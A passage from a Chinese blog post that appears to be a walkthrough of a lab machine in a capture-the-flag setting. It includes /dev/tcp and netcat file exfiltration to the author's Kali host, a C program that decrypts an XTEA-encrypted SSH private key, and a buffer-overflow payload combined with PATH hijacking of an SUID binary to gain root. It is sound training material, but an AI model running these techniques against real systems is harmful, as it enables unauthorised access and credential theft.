-rw-------    1 root     root            79 Jun 27 14:12 .ash_history
6ab28be27b0c:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
6ab28be27b0c:~# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
4: eth0@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN&gt; mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever

</code></pre>
<p>后面这里扒拉了很久，我都没看到，甚至于我都去打内核漏洞了.....</p>
<p>实在顶不住了想去问作者，作者应该是那时候有事，然后我就想到Sublarge应该是测过的，所以我就直接去问他了</p>
<p>Sublarge说是/usr/bin有一个userLogin</p>
<pre class="notranslate"><code class="notranslate">6ab28be27b0c:~# ls -la /usr/bin/userLogin 
-rwxr-xr-x    1 root     root        772016 Jun 24 13:15 /usr/bin/userLogin
</code></pre>
<h2>五、提权之路：解密密钥与最终ROOT</h2>
<p>确实有，然后我就想测一下他的功能</p>
<pre class="notranslate"><code class="notranslate">6ab28be27b0c:~# /usr/bin/userLogin
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin -h
error: No such file or directory
6ab28be27b0c:~# /usr/bin/userLogin --help
error: No such file or directory
</code></pre>
<p>没有有价值的，那我就想拉过去给kali</p>
<p>kali监听</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 1234 &gt; userLogin
listening on [any] 1234 ...
</code></pre>
<p>docker2发送</p>
<pre class="notranslate"><code class="notranslate">6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
</code></pre>
<p>不行，瞄眼shell</p>
<pre class="notranslate"><code class="notranslate">6ab28be27b0c:~# echo $0
-sh
6ab28be27b0c:~# which bash
/bin/bash
6ab28be27b0c:~# /bin/bash
6ab28be27b0c:~# echo $0
/bin/bash
6ab28be27b0c:~# cat /usr/bin/userLogin &gt; /dev/tcp/192.168.205.128/1234
</code></pre>
<p>行了，拖去ida</p>
<h3>5.1 二进制逆向与XTEA解密</h3>
<p>随便扒拉了一下，是一个加密程序</p>
<p>使用xtea加密，输入文件是id_ed25519，输出output.enc</p>
<p>这里费了老大劲</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ vim a.c     
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cat a.c      
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define ENCRYPTED_FILE "output.enc"
#define DECRYPTED_FILE "decrypted_file"

const char FIXED_KEY_STR[] = "key-for-user-ldzid_ed25519";

void gen_key(uint32_t *k) {
    const unsigned char *s = (const unsigned char *)FIXED_KEY_STR;
    for (int i = 0; i &lt; 4; ++i) {
        k[i] = (uint32_t)s[4*i+2] &lt;&lt; 16 |
               (uint32_t)s[4*i+1] &lt;&lt; 8  |
               (uint32_t)s[4*i]        |
               (uint32_t)s[4*i+3] &lt;&lt; 24;
    }
}

void xtea_decrypt(uint32_t *v, const uint32_t *k) {
    uint32_t v0 = v[0], v1 = v[1];
    const uint32_t delta = 0x9E3779B9;
    const int n_rounds = 64;
    uint32_t sum = delta * n_rounds;

    for (int i = 0; i &lt; n_rounds; ++i) {
        v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (sum + k[(sum &gt;&gt; 11) &amp; 3]);
        sum -= delta;
        v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (sum + k[sum &amp; 3]);
    }

    v[0] = v0;
    v[1] = v1;
}

int main() {
    FILE *fin, *fout;
    uint32_t key[4];
    uint64_t block;
    size_t br;

    printf("开始解密...\n");
    printf("输入文件（加密）: %s\n", ENCRYPTED_FILE);
    printf("输出文件（解密）: %s\n", DECRYPTED_FILE);

    fin = fopen(ENCRYPTED_FILE, "rb");
    if (!fin) {
        perror("无法打开加密文件");
        return 1;
    }

    fout = fopen(DECRYPTED_FILE, "wb");
    if (!fout) {
        perror("无法创建输出文件");
        fclose(fin);
        return 1;
    }

    gen_key(key);

    while ((br = fread(&amp;block, 1, 8, fin)) &gt; 0) {
        if (br != 8) {
            printf("\n警告：读取到不完整的数据块 (%zu 字节)，文件可能已损坏。\n", br);
        }

        xtea_decrypt((uint32_t *)&amp;block, key);
        fwrite(&amp;block, 1, 8, fout);
    }

    fclose(fin);
    fclose(fout);

    printf("\n解密完成。\n");
    printf("注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。\n");

    return 0;
}
       
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ gcc a.c -o a                  
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ ./a      
开始解密...
输入文件（加密）: output.enc
输出文件（解密）: decrypted_file

解密完成。
注意：原始文件可能被填充了零字节以对齐 8 字节边界，因此输出文件末尾可能会有多余的空字节。
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ file decrypted_file
decrypted_file: OpenSSH private key
                             
</code></pre>
<h3>5.2 普通用户权限获取</h3>
<p>因为我这kali部署问题，所以要拉去/tmp连接，你的应该不用</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cp decrypted_file /tmp/id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/…/gx/x/tmp/jiemi]
└─$ cd /tmp                      
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa    
-rwxr-xr-x 1 kali kali 400  6月27日 21:31 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ ls -al id_rsa   
-rw------- 1 kali kali 400  6月27日 21:31 id_rsa
            
┌──(kali㉿kali)-[/tmp]
└─$ ssh ldz@192.168.205.131 -i /tmp/id_rsa     
The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.
ED25519 key fingerprint is SHA256:B9Pod6bX/35WGX2264fO3mYHE9TOsUwS6RGy8ZAswug.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.

localhost:~$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
</code></pre>
<p>（用户名是在userLogin的伪c里面看到的，当然你也可以使用ssh-keygen -l -f看）继续找东西</p>
<pre class="notranslate"><code class="notranslate">localhost:~$ ls -la
total 28
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 .
drwxr-xr-x    3 root     root          4096 Apr 28 00:29 ..
-rw-------    1 ldz      ldz             15 Jun 27 22:33 .ash_history
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .ssh
-rw-------    1 ldz      ldz           4178 Jun 26 12:58 .viminfo
-rw-------    1 ldz      ldz             39 Jun 24 10:12 user.txt
localhost:~$ cat user.txt 
flag{ce6560c893e5cfec48e0fd186dc03718}
localhost:~$ cat .viminfo 
# This viminfo file was generated by Vim 9.1.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Search Pattern:
~MSle0~/Pub

# Command Line History (newest to oldest):
:wq
|2,0,1750913922,,"wq"
:q
|2,0,1750913922,,"q"
:q!
|2,0,1750786392,,"q!"
:Q
|2,0,1750731057,,"Q"

# Search String History (newest to oldest):
?/Pub
|2,1,1750769276,47,"Pub"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
""1     LINE    0
        vim .ash_history 
|3,1,1,1,1,0,1750913920,"vim .ash_history "
"2      LINE    0
        history 
|3,0,2,1,1,0,1750913920,"history "
"3      LINE    0

|3,0,3,1,1,0,1750913920,""
"4      LINE    0
            int flag = 0;
|3,0,4,1,1,0,1750786253,"    int flag = 0;"

# File marks:
'0  1  0  ~/.ash_history
|4,48,1,0,1750913922,"~/.ash_history"
'1  13  12  /opt/vuln.c
|4,49,13,12,1750786392,"/opt/vuln.c"
'2  30  0  /opt/vuln.c
|4,50,30,0,1750786258,"/opt/vuln.c"
'3  30  0  /opt/vuln.c
|4,51,30,0,1750786258,"/opt/vuln.c"
'4  43  0  /etc/ssh/sshd_config
|4,52,43,0,1750769292,"/etc/ssh/sshd_config"

# Jumplist (newest first):
-'  1  0  ~/.ash_history
|4,39,1,0,1750913922,"~/.ash_history"
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,"/opt/vuln.c"
-'  13  12  /opt/vuln.c
|4,39,13,12,1750786392,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786357,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,"/opt/vuln.c"
-'  30  0  /opt/vuln.c
|4,39,30,0,1750786258,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  1  0  /opt/vuln.c
|4,39,1,0,1750786255,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  11  4  /opt/vuln.c
|4,39,11,4,1750786254,"/opt/vuln.c"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  43  0  /etc/ssh/sshd_config
|4,39,43,0,1750769292,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  19  2  /etc/ssh/sshd_config
|4,39,19,2,1750769276,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"
-'  1  0  /etc/ssh/sshd_config
|4,39,1,0,1750769258,"/etc/ssh/sshd_config"

# History of marks within files (newest to oldest):

&gt; ~/.ash_history
        *       1750913922      0
        "       1       0
        .       1       0
        +       1       0

&gt; /opt/vuln.c
        *       1750786390      0
        "       13      12
        ^       13      13
        .       13      12
        +       11      0
        +       13      12

&gt; /etc/ssh/sshd_config
        *       1750769290      0
        "       43      0
        ^       43      0
        .       41      0
        +       41      0
localhost:~$ cd .ssh/
localhost:~/.ssh$ ls -al
total 28
drwx--S---    2 ldz      ldz           4096 Jun 25 13:18 .
drwxr-sr-x    3 ldz      ldz           4096 Jun 26 13:03 ..
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:51 authorized_keys
-rw-------    1 ldz      ldz            399 Jun 24 20:43 id_ed25519
-rw-r--r--    1 ldz      ldz             95 Jun 24 20:43 id_ed25519.pub
-rw-------    1 ldz      ldz            828 Jun 25 13:18 known_hosts
-rw-r--r--    1 ldz      ldz             92 Jun 25 13:18 known_hosts.old
localhost:~/.ssh$ ssh-keygen -l -f id_ed25519
256 SHA256:N14sJc5eu0fTD2oG9XrFil1dcsAbsSw3JjqW6vmwheg ldz@localhost (ED25519)
</code></pre>
<h3>5.3 SUID提权与PATH劫持</h3>
<p>找不到，看到vim的历史记录有修改过/opt/vuln去看看</p>
<pre class="notranslate"><code class="notranslate">localhost:~/.ssh$ cd /opt/
localhost:/opt$ ls -al
total 40
drwxr-xr-x    5 root     root          4096 Jun 25 01:42 .
drwxr-xr-x   21 root     root          4096 Jun 25 01:45 ..
drwx--x--x    4 root     root          4096 Jun 16 16:03 containerd
drw-------    2 root     root          4096 Jun 24 19:55 server
drw-------    3 root     root          4096 Jun 25 01:52 server2
-rwsr-xr-x    1 root     root         19968 Jun 25 01:33 vuln
localhost:/opt$ ./vuln 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
flag = 0
password wrong
</code></pre>
<p>有点像溢出，拖过来看看<br>
老样子，kali监听</p>
<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nc -lvnp 1234 &gt; vuln     
listening on [any] 1234 ...

</code></pre>
<p>靶机推送</p>
<pre class="notranslate"><code class="notranslate">localhost:/opt$ cat vuln &gt; /dev/tcp/192.168.205.128/1234
-sh: can't create /dev/tcp/192.168.205.128/1234: nonexistent directory
localhost:/opt$ which bash
</code></pre>
<p>ok，那没事了，拿scp推</p>
<pre class="notranslate"><code class="notranslate">localhost:/opt$ scp vuln kali@192.168.205.128:/mnt/hgfs/gx/x/tmp
The authenticity of host '192.168.205.128 (192.168.205.128)' can't be established.
ED25519 key fingerprint is SHA256:0EmnEbFZ1K2Otrqlk0b3OHH8M36kr43dnKXNZ9+mcLI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '192.168.205.128' (ED25519) to the list of known hosts.
kali@192.168.205.128's password: 
vuln                                                                                                                                            100%   20KB   8.9MB/s   00:00   
</code></pre>
<p>拖去ida</p>
<pre class="notranslate"><code class="notranslate">void __cdecl vuln()
{
  char buffer[32]; // [rsp+0h] [rbp-30h] BYREF
  ssize_t n; // [rsp+20h] [rbp-10h]
  int flag; // [rsp+2Ch] [rbp-4h]

  flag = 0;
  n = read(0, buffer, 0x30uLL);
  if ( flag == 1 )
  {
    secret();
  }
  else
  {
    printf("flag = %d\n", (unsigned int)flag);
    puts("password wrong");
  }
}

void __cdecl secret()
{
  setuid(0);
  system("cat /etc/shadow");
}
</code></pre>
<p>看来一下，确实是溢出<br>
你想拿shell也可以，玩法挺多</p>
<pre class="notranslate"><code class="notranslate">localhost:/opt$ id
uid=1000(ldz) gid=1000(ldz) groups=1000(ldz)
localhost:/opt$ tty
/dev/pts/0
localhost:/opt$ cd /home/ldz
localhost:~$ echo "/bin/sh &lt; /dev/pts/0" &gt; cat
localhost:~$ chmod +x cat
localhost:~$ (printf 'A%.0s' $(seq 1 44); printf '\x01\x00\x00\x00') &gt; p
localhost:~$ xxd p
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000020: 4141 4141 4141 4141 4141 4141 0100 0000  AAAAAAAAAAAA....
localhost:~$ export PATH=/home/ldz:$PATH
localhost:~$ cd /opt
localhost:/opt$ ./vuln &lt; /home/ldz/p
/opt # id
uid=0(root) gid=1000(ldz) groups=1000(ldz)
/opt # export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$HOME/bin
/opt # cat /root/root.txt 
flag{98ecb90d5dcef41e1bd18f47697f287a}
</code></pre>
<p>评价一下这个靶机<br>
<a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/71c0e482ae2ccefcb7aa55cf2f02c9e2bd763f48f6b4458a199f9297e0022a64/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632383039343831353135312e77656270"><img src="https://camo.githubusercontent.com/71c0e482ae2ccefcb7aa55cf2f02c9e2bd763f48f6b4458a199f9297e0022a64/68747470733a2f2f377231756d70686b2e6769746875622e696f2f696d6167652f32303235303632383039343831353135312e77656270" alt="image-20250628094814909" data-canonical-src="https://7r1umphk.github.io/image/20250628094815151.webp" style="max-width: 100%;"></a></p>
<p>哈哈，没打过的可以期待一手</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
    script.setAttribute("issue-term","title");
    
    script.setAttribute("theme","github-light");
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>
</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>

</html>
